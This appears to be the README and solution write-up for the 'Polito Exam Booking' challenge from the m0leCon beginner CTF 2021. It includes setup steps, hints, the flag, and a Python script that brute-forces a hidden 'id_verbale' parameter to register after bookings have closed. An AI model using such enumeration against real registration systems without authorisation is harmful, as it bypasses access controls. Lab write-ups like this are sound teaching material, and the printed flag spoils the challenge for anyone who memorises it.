# m0leCon beginner CTF 2021 challenge

m0leCon beginner CTF 2021 was a beginner-friendly capture the flag competition organized by 
[Politecnico di Torino](https://www.polito.it/)'s cybersecurity student team 
[pwnthem0le](https://pwnthem0le.polito.it/). Mainly aimed towards Politecnico di Torino's students the competion 
was open to everyone to join and was held online on 3rd December 2021.

## Descritpion

### Polito Exam Booking (medium difficulty)
Your dear friend Pwnlo M0flag studied really hard for his 'Hacktivism' exam. He was so engrossed in studying that he 
forgot to register and now registrations are closed. Can you help your friend register anyway?

### How to launch it
Both the ```Dockerfile``` and the ```docker-compose.yaml``` files are provided to launch the server through 
[Docker](https://www.docker.com/).<br>
Alternatively the server can be started directly through [Python](https://www.python.org/). Through a terrminal, 
first install Flask<br>
```pip3 install Flask```<br>
then go into the ```app``` folder and run the server<br>
```python3 -u main.py```

### Hint
- Who said you can't book the exam anymore? Try asking it!
- If you miss something, guess it! You can try and try again (just be smart)

### Flag
ptm{S3rveR_s1d3_v4liDa7ion_go3s_bRRRRRR}

## Solution
By looking at the source code of the webpage we see that when booking an exam the function ```onClickPrenota()``` 
gets called with parameters unique to the exam. All the needed data for the function can be obtained from the webpage 
but the parameter ```id_verbale```. Thus, we need to bruteforce it. It can be done directly through the debug console, 
but, since JS is not my forte i wrote this little python script to do it:
```python3
import requests # might be not installed, to install run 'pip install requests'
import re

# Asking for the link of the "api", it can be hardcoded
link = input('Link of the api: ')

data = {'id_verbale': 0, 'cod_ins': '01ELEET', 'd_ini_appel': '', 'd_fin_appel': '', 'data_appello': '2021-07-05',
        'frequenza': 2021, 'nome_insegnamento': 'Hacktivism', 'docente': 'ROBOT MR',
        'data_ora_appello': '05-07-2021 17:00', 'desc_tipo': 'Esami scritti a risposta aperta o chiusa tramite PC',
        'note': 'Please be advised that to take the test you need your credential for the PORTALE DELLA DIDATTICA. In '
                'the REMOTE EXAMS part you will find the link to the test. At the begging of the test, '
                'following respondus instructions, you must show a valid photo ID to the webcam in such a way that it '
                'can be read.',
        'mat_docente': '30120', 'aula': ' ', 'posti_liberi': 999}

for _ in range(736):
    data['id_verbale'] = _
    r = requests.post(link, json=data)
    if 'ptm{' in r.text:
        print(re.search("ptm{.+}", r.text).group(0))
        break
```
